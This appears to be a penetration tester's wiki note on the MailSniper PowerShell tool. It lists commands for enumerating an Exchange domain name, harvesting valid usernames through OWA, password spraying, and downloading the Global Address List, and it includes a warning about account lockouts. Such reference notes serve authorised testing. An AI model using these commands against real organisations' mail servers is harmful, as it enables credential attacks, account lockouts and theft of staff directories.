# MailSniper

---

## Import MailSniper

See [[powershell#Import a PowerShell Module]].

---

## Enumerate the NetBIOS Name of the Target Domain

With MailSniper imported:

```powershell
Invoke-DomainHarvestOWA -ExchHostname $IP_ADDRESS_OF_EXCHANGE_SERVER
```

---

## Determine Valid User Accounts Against an Exchange Server

```powershell
Invoke-UsernameHarvestOWA -ExchHostname $IP_ADDRESS_OF_EXCHANGE_SERVER -Domain $NETBIOS_NAME_OF_DOMAIN -UserList $PATH_TO_USERNAME_FILE -Outfile $PATH_TO_OUTPUT_FILE
```

---

## Password Spray

```powershell
Invoke-PasswordSprayOWA -ExchHostname $IP_ADDRESS_OF_EXCHANGE_SERVER -UserList $PATH_TO_VALID_USERNAME_FILE -Password $PASSWORD
```

`$PATH_TO_VALID_USERNAME_FILE` is output from [[MailSniper#Determine Valid User Accounts Against an Exchange Server|determining valid user accounts with MailSniper]].

**Note** that these authentication attempts may count towards the domain lockout policy for users. Too many attempts in a short time period is not only loud, but can lock out accounts.

---

## Download the Global Address List

Valid credential required.

```powershell
Get-GlobalAddressList -ExchHostname $IP_ADDRESS_OF_EXCHANGE_SERVER -UserName $DOMAIN\$USERNAME -Password $PASSWORD -Outfile $PATH_TO_OUTPUT_FILE
```

---

## References

[MailSniper - GitHub Repository](https://github.com/dafthack/MailSniper)
